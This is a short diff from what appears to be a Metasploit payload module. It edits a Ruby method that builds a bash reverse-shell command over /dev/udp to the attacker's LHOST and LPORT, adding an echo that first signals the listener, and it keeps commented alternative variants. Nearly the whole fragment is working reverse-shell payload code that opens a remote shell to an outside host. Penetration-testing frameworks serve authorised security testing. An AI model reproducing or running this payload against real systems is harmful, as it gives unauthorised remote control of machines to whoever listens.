@@ -55,7 +55,7 @@ module MetasploitModule
   #
   def command_string
     fd = rand(200) + 20
-    return "0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
+    return "0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};sh <&#{fd} >&#{fd} 2>&#{fd}";
     # same thing, no semicolons
     #return "/bin/bash #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}"
     # same thing, no spaces
